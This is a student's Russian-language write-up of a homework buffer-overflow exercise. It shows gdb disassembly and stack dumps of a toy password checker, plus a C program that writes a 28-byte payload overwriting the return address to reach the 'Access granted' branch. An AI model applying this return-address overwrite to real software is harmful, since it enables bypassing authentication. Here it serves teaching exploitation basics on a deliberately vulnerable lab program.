d5ex2 - Домашнее задание 5, упражнение 2
Задание - атака переполнения буфера, записать через вводимые данные нужный код возврата так
что бы передать управление на нужную строку

Файлы 
1. Read.me  - этот файл, описание решения
2. d5ex2.c    исходный файл
3. d5ex2_fg.с генератор файла последовательности
4. code1      файл последовательности для перенаправления ввода и совершения атаки
5. Кадр функции.png       
6. Победа.png   

/*
wh@wh-VirtualBox:~/Eltex/d5$ gcc d5ex2.o -c -g -o d5ex2   
gcc: warning: d5ex2.o: linker input file unused because linking not done

осталось разобраться что это, исполняемого созданно не было,
пока все стер и перекомпилял с этапа предпроцессора,
сообщение исчезло
*/


(gdb)
>b main
>disassemble

   0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   %rbp
   0x000000000040119b <+5>:	mov    %rsp,%rbp
   0x000000000040119e <+8>:	sub    $0x10,%rsp
=> 0x00000000004011a2 <+12>:	lea    0xe5b(%rip),%rax        # 0x402004
   0x00000000004011a9 <+19>:	mov    %rax,%rdi
   0x00000000004011ac <+22>:	call   0x401070 <puts@plt>
   0x00000000004011b1 <+27>:	call   0x4011ee <IsPassOk>
   0x00000000004011b6 <+32>:	mov    %eax,-0x4(%rbp)
   0x00000000004011b9 <+35>:	cmpl   $0x0,-0x4(%rbp)
   0x00000000004011bd <+39>:	jne    0x4011d8 <main+66>
   0x00000000004011bf <+41>:	lea    0xe4e(%rip),%rax        # 0x402014
   0x00000000004011c6 <+48>:	mov    %rax,%rdi
   0x00000000004011c9 <+51>:	call   0x401070 <puts@plt>
   0x00000000004011ce <+56>:	mov    $0x1,%edi
   0x00000000004011d3 <+61>:	call   0x4010a0 <exit@plt>                         
                             // По скольку код программы известен, можно сделать 
                             // можно сделать предположение что нужный адресс  будет 
   // V-этот адрес-V                            
   0x00000000004011d8 <+66>:	lea    0xe43(%rip),%rax        # 0x402022
   0x00000000004011df <+73>:	mov    %rax,%rdi
   0x00000000004011e2 <+76>:	call   0x401070 <puts@plt>
   0x00000000004011e7 <+81>:	mov    $0x0,%eax
   0x00000000004011ec <+86>:	leave
   0x00000000004011ed <+87>:	ret
   
   //проверим предположение, это 30ая строка в моем исходнике:
   //28 exit(1);                                         
   //29 } else {
   //30 printf("Access granted!\n"); // Строка для которой нужно выяснить адрес  
   //31 }
   //32 return 0;
   
   // Дойдем до нее
  
  (gdb) 
   > u 30
   <вводим пароль test>
   > disassemble
   
   Dump of assembler code for function main:
   0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   %rbp
   0x000000000040119b <+5>:	mov    %rsp,%rbp
   0x000000000040119e <+8>:	sub    $0x10,%rsp
   0x00000000004011a2 <+12>:	lea    0xe5b(%rip),%rax        # 0x402004
   0x00000000004011a9 <+19>:	mov    %rax,%rdi
   0x00000000004011ac <+22>:	call   0x401070 <puts@plt>
   0x00000000004011b1 <+27>:	call   0x4011ee <IsPassOk>
   0x00000000004011b6 <+32>:	mov    %eax,-0x4(%rbp)
   0x00000000004011b9 <+35>:	cmpl   $0x0,-0x4(%rbp)
   0x00000000004011bd <+39>:	jne    0x4011d8 <main+66>
   0x00000000004011bf <+41>:	lea    0xe4e(%rip),%rax        # 0x402014
   0x00000000004011c6 <+48>:	mov    %rax,%rdi
   0x00000000004011c9 <+51>:	call   0x401070 <puts@plt>
   0x00000000004011ce <+56>:	mov    $0x1,%edi
   0x00000000004011d3 <+61>:	call   0x4010a0 <exit@plt>
=> 0x00000000004011d8 <+66>:	lea    0xe43(%rip),%rax        # 0x402022
   0x00000000004011df <+73>:	mov    %rax,%rdi
   0x00000000004011e2 <+76>:	call   0x401070 <puts@plt>
   0x00000000004011e7 <+81>:	mov    $0x0,%eax
   0x00000000004011ec <+86>:	leave
   0x00000000004011ed <+87>:	ret

// Итого, 0x00000000004011d8 адрес который нужно записать в ячейку адреса возврата

// rbp-rsp=0x10=16 байт ( это наш массив + выравнивание) + 8(rbp)+8(адр возврата)=32

(gdb) p $rbp
$1 = (void *) 0x7fffffffdd90
(gdb) p $rsp
$2 = (void *) 0x7fffffffdd80

// 16-12 байт=4 байта - это выравнивание? , найдем его в памяти

//Перезапуск отладки
> b IsPassOk
> n
  123456789055  //ввели нашу строку не выходя за рамки
>39	return 0 == strcmp(Pass, "test");

 >p $rsp
$3 = (void *) 0x7fffffffdd60
> p $rbp
$4 = (void *) 0x7fffffffdd70

//Адреса поменялись, логика осталась

> x/32bx 0x7fffffffdd60    //выведем эту область памяти и подумаем

                                                  1       2       3       4
0x7fffffffdd60:	0x00	0x3e	0x40	0x00	0x31	0x32	0x33	0x34
                  5       6       7       8       9       10     11      12
0x7fffffffdd68:	0x35	0x36	0x37	0x38	0x39	0x30	0x35	0x35

0x7fffffffdd70:	0x00	0xdd	0xff	0xff	0xff	0x7f	0x00	0x00    <-- rbp

0x7fffffffdd78:	0xb6	0x11	0x40	0x00	0x00	0x00	0x00	0x00    <-- адрес возврата

//итого, первые 4 байта это не выравнивание, но не важно, главное они в начале 
//длина последовательности составит 32-4=28 байт, последние 8 из них наш 
//адрес возврата

//Итого нужно сгенерить файл последовательности, для меня проще всего через программку:

#include <stdio.h>
#include <stdlib.h>

#define Z 28

int main(void)
{
unsigned char A[Z] = {'x','x','x','x','x','x','x','x','x','x', //символьный мусор 10
                      'x','x',                                 //мусор  2 , итого 12-наша строка
                              'x','x','x','x','x','x','x','x', // перетираем rbp
                       0xD8, 0x11, 0x40, 0x00, 0x00, 0x00, 0x0, 0x0  //0x 40 11 d8  - нужный адрес возврата
                       };

FILE *fp;
if ((fp = fopen("code1", "wb"))==NULL)  { printf("Cannot open file.\n"); exit(1);}
fwrite(A, sizeof(char), Z, fp);
    fclose(fp); 
}

//Ребята подсказали что можно сделать и проще: 
// echo -e "XX..X\0xd8\0x11\0x40\..."

/*
Итого, перенаправляем ввод и ПОБЕДА!   (см снимок победа.png)

wh@wh-VirtualBox:~/Eltex/d5$ ./d5ex2 < code1
Enter password:
Access granted!
Ошибка шины (образ памяти сброшен на диск)
*/










   
